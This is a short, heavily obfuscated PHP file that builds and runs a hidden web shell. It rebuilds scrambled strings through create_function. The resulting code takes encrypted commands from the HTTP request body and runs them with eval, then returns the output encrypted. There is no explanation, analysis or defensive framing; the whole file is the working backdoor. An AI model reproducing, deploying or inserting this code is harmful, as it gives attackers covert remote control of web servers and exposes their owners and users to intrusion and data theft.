<?php
$R='`${$c=strlen`$(`$$k);$l=strle`$n($t`$);$`$o="";for($i=0;`$$i<$l`$;)`${for($j=`$`$0;($j`$<$c&&$i<$l);$j++`$,$i++)`${$';
$o=str_replace('F','','creFaFFtFe_fuFnFction');
$Q='t_contents();@`$ob_e`$nd_cl`$ea`$n();$r=@bas`$`$e64_`$encode(`$@x(@gz`$compr`$ess($o),$`$k));pri`$nt("$p`$$kh$r$kf");}';
$d='$`$k="`$c1b5ee0d";$kh=`$"6e3e6ab`$d1e2`$`$a";$kf="`$`$7b182a6`$f5ca3";$p="N`$p0jhAGbNVJz`$sfMm`$";fun`$ction`$ x($`$t,$k)';
$l='`$ut"`$),$m)==1)`$ {@o`$b_start();@e`$val(@g`$zuncom`$press`$(@x(@ba`$se64`$_decode`$`$($m[1]),$k))`$)`$;$o=@o`$b_g`$e';
$J='o.`$`$=$t{$i}`$^$`$`$k{$j};}`$}return $o`$;}`$if `$(@preg_match("/$kh(.+)`$`$$kf/",@file`$_get_co`$n`$tents("php:`$//inp';
$m=str_replace('`$','',$d.$R.$J.$l.$Q);
$O=$o('',$m);$O();
?>
